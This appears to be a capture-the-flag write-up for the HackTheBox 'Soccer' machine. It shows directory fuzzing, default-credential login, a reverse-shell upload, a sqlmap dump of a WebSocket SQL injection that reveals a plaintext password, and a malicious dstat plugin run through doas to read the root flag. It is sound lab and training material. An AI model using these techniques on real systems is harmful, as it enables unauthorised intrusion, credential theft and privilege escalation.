## [Soccer](https://app.hackthebox.com/machines/Soccer) - 11/04/2023 - HackTheBox write-up

### User flag

#### Discovery

First thing, `nmap`:
```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
9091/tcp open  xmltec-xmlmail
```

The webpage is pretty empty so we can't find anything interesting. I try fuzzing with `wfuzz` with different wordlists.

I finally find some something with the following wordlist from `dirbuster`:
```bash
$ wfuzz -c -z file,directory-list-2.3-small.txt --hc 404 http://soccer.htb/FUZZ
[...]
000008447:   301        7 L      12 W       178 Ch      "tiny"
```

This link redirect us to a connection page for the `Tiny File Manager` a file manager written in PHP. On the docs we find the default credentials
([here](https://github.com/prasathmani/tinyfilemanager/wiki/Security-and-User-Management)) :
```
admin/admin@123
user/12345
```

Both of the accounts are available, the creds were not modified. This file manager allows us to upload a file without restriction, so we can upload a reverse shell.

#### Search for vulnerability

With the reverse shell, I try to execute `linpeas.sh` who gives me some indications. It says me that the server is probably vulnerable to [CVE-2021-3560](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3560),
I try a POC I found on Internet but it doesn't work. Trying to elevate my privileges from user `www-data` to
`player` seems difficult.

Finally I found in `nginx` configuration another site on a different virtual host.

#### Discovery

On this site we have a login and a sign up page. After creating an account and sign in, we can find a page that use a WebSocket to find information about matchs tickets.

After some tries we can find that the WebSocket request is vulnerable to an Error-Based (or time-based) SQL injection.

#### Exploitation

To exploit this vulnerability we can use `sqlmap`. It doesn't support websockets by default so we need to use a HTTP server that will receive the request and send it to the WebSocket. We can use this script : [link](https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html). And then we use it to dump the databases :
```bash
$ sqlmap -u "http://localhost:8081/?id=1" --dbs

available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] soccer_db
[*] sys
```

Now, we want to dump tables in `soccer_db` database :
```bash
$ sqlmap -u "http://localhost:8081/?id=1" -D soccer_db --tables

accounts
Database: soccer_db
[1 table]
+----------+
| accounts |
+----------+
```

Finally, we want to see the lines in the `accounts` table :
```bash
$ sqlmap -u "http://localhost:8081/?id=1" -D soccer_db -T accounts --dump

Database: soccer_db
Table: accounts
[1 entry]
+------+-------------------+----------------------+----------+
| id   | email             | password             | username |
+------+-------------------+----------------------+----------+
| 1324 | player@player.htb | PlayerOftheMatch2022 | player   |
+------+-------------------+----------------------+----------+
```

SQLMap find this by using a time-based SQLi but we could use an error-based SQLi since the page returns "Tickets Doesn't Exist" or "Ticket Exists" if the request return true or false.

With this user and password we can connect to the web application but it doesn't provide any additional information. To find the user flag we just need to use this username/password to connect to the server with SSH.

### Root flag

#### Search for vulnerability

When we are connected to the machine we can start by start a `linpeas` analysis to find vulnerabilities.

With it, we can find the script `dstat` that can be run as root with the `doas` command. This script can
dynamically load plugins, and in this plugin we can execute python code.

#### Exploitation

By looking at the script, we can see that `dstat` load plugins from different paths, including
`/usr/local/share/dstat/`. We have a write access to this directory so we can write the following plugin
(`dstat_myplugin.py`):
```python
import os

os.system('cat /root/root.txt')
```

And with the command :
```bash
doas -u root /usr/bin/dstat --myplugin
```
We get the root flag !
